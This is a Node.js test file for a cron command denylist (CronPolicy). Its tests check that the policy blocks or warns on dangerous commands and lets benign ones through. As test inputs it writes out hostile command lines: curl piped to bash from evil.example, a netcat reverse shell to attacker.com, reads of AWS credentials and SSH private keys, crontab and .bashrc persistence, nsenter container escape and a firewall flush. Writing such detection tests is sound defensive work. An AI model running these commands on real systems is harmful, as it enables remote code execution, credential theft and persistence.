'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert');
const {
  CronPolicy,
  BUILTIN_DENYLIST,
  validateDenylistRule,
  loadUserDenylistFromConfig,
} = require('../../src/main/cron-policy');

describe('CronPolicy denylist', () => {
  test('blocks SSH reverse port forwarding', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('ssh -R 8080:localhost:80 user@host');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'net.reverse_ssh');
    assert.strictEqual(hit.rule.action, 'block');
  });

  test('blocks SSH dynamic SOCKS proxy', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('ssh -D 1080 user@host');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'net.reverse_ssh');
  });

  test('blocks curl piped to bash', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('curl https://evil.example/x.sh | bash');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'net.curl_pipe_bash');
  });

  test('blocks netcat reverse shell', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('nc -e /bin/sh attacker.com 4444');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'net.nc_exec');
  });

  test('blocks reading AWS credentials', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('cat ~/.aws/credentials');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'cred.read_aws_creds');
  });

  test('blocks reading SSH private keys', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('cat /root/.ssh/id_rsa');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'cred.read_ssh_keys');
  });

  test('blocks crontab editing', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('crontab -e');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'persist.write_crontab');
  });

  test('blocks shell rc file tampering', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('echo "evil" >> ~/.bashrc');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'persist.shell_rc_tamper');
  });

  test('blocks nsenter container escape', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('nsenter --target 1 --pid --mount');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'escape.nsenter');
  });

  test('blocks firewall flush', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('iptables -F');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'integrity.firewall_flush');
  });

  test('warns on user enumeration', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('whoami');
    assert.ok(hit);
    assert.strictEqual(hit.rule.action, 'warn');
  });

  test('does NOT block normal rm in subdirectory', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('rm -rf /tmp/myapp/cache/*');
    assert.strictEqual(hit, null);
  });

  test('does NOT block git push or curl download (without pipe)', () => {
    const policy = new CronPolicy();
    assert.strictEqual(policy.evaluate('git push origin main'), null);
    assert.strictEqual(policy.evaluate('curl -O https://example.com/file.tar.gz'), null);
  });

  test('does NOT block curl with no pipe (just fetch)', () => {
    const policy = new CronPolicy();
    // 关键场景：用户主动想让 cron 跑 curl 抓数据，应该不被拦截
    const hit = policy.evaluate('curl https://api.example.com/data.json -o data.json');
    assert.strictEqual(hit, null);
  });

  test('does NOT block apt install', () => {
    const policy = new CronPolicy();
    const hit = policy.evaluate('apt-get install -y curl');
    assert.strictEqual(hit, null);
  });

  test('handles empty / non-string commands', () => {
    const policy = new CronPolicy();
    assert.strictEqual(policy.evaluate(''), null);
    assert.strictEqual(policy.evaluate(null), null);
    assert.strictEqual(policy.evaluate(undefined), null);
  });
});

describe('CronPolicy user extras', () => {
  test('loads static extra rules', () => {
    const policy = new CronPolicy({
      extraRules: [
        {
          id: 'user.test',
          category: 'user_defined',
          action: 'block',
          pattern: String.raw`\bmyblocklist-tool\b`,
          description: 'Test rule',
        },
      ],
    });
    const hit = policy.evaluate('myblocklist-tool --run');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'user.test');
  });

  test('loads extra rules from config provider', () => {
    const config = {
      get: () => ({
        cronExtraDenylist: [
          {
            pattern: String.raw`\bmycustom-blocker\b`,
            action: 'block',
            description: 'Custom from config',
          },
        ],
      }),
    };
    const policy = new CronPolicy({ configProvider: config });
    const hit = policy.evaluate('mycustom-blocker --do-thing');
    assert.ok(hit);
    assert.strictEqual(hit.rule.id, 'user.config.0');
  });

  test('ignores invalid regex patterns gracefully', () => {
    const policy = new CronPolicy({
      extraRules: [
        {
          id: 'broken',
          category: 'user_defined',
          action: 'block',
          pattern: '[invalid(',  // unmatched bracket
          description: 'Should be skipped',
        },
      ],
    });
    // Should not throw, just skip the invalid rule
    assert.strictEqual(policy.evaluate('anything'), null);
  });
});

describe('validateDenylistRule', () => {
  test('accepts valid block rule', () => {
    const result = validateDenylistRule({
      pattern: String.raw`\bfoo\b`,
      action: 'block',
      description: 'foo command',
    });
    assert.strictEqual(result.ok, true);
  });

  test('accepts valid warn rule', () => {
    const result = validateDenylistRule({
      pattern: String.raw`\bbar\b`,
      action: 'warn',
    });
    assert.strictEqual(result.ok, true);
  });

  test('rejects empty pattern', () => {
    const result = validateDenylistRule({ pattern: '' });
    assert.strictEqual(result.ok, false);
    assert.match(result.error, /pattern/);
  });

  test('rejects invalid regex', () => {
    const result = validateDenylistRule({ pattern: '[invalid(' });
    assert.strictEqual(result.ok, false);
    assert.match(result.error, /正则无效/);
  });

  test('rejects invalid action', () => {
    const result = validateDenylistRule({
      pattern: String.raw`\bfoo\b`,
      action: 'explode',
    });
    assert.strictEqual(result.ok, false);
    assert.match(result.error, /action/);
  });

  test('rejects non-object input', () => {
    const result1 = validateDenylistRule(null);
    const result2 = validateDenylistRule('string');
    assert.strictEqual(result1.ok, false);
    assert.strictEqual(result2.ok, false);
  });
});

describe('CronPolicy.listBuiltinRules', () => {
  test('returns metadata for all builtin rules', () => {
    const policy = new CronPolicy();
    const rules = policy.listBuiltinRules();
    assert.ok(rules.length >= 15);
    assert.ok(rules.every(r => r.id && r.category && r.action && r.description));
    // Patterns should NOT be in the listing (those are sensitive)
    assert.ok(rules.every(r => !('pattern' in r)));
  });
});

describe('CronPolicy.shouldBlock vs shouldWarn', () => {
  test('shouldBlock returns only block-action hits', () => {
    const policy = new CronPolicy();
    // whoami is 'warn' only
    assert.strictEqual(policy.shouldBlock('whoami'), null);
    assert.ok(policy.shouldWarn('whoami'));
    // ssh reverse port is 'block'
    assert.ok(policy.shouldBlock('ssh -R 80:host:80 user@x'));
    assert.strictEqual(policy.shouldWarn('ssh -R 80:host:80 user@x'), null);
  });
});

describe('CronPolicy built-in inventory sanity', () => {
  test('every builtin rule has a valid regex', () => {
    for (const rule of BUILTIN_DENYLIST) {
      assert.ok(typeof rule.pattern === 'string', `rule ${rule.id} pattern not a string`);
      assert.doesNotThrow(() => new RegExp(rule.pattern, 'i'), `rule ${rule.id} has invalid pattern`);
      assert.ok(['block', 'warn'].includes(rule.action), `rule ${rule.id} invalid action`);
    }
  });

  test('builtin rule ids are unique', () => {
    const ids = BUILTIN_DENYLIST.map(r => r.id);
    assert.strictEqual(new Set(ids).size, ids.length, 'duplicate rule ids found');
  });
});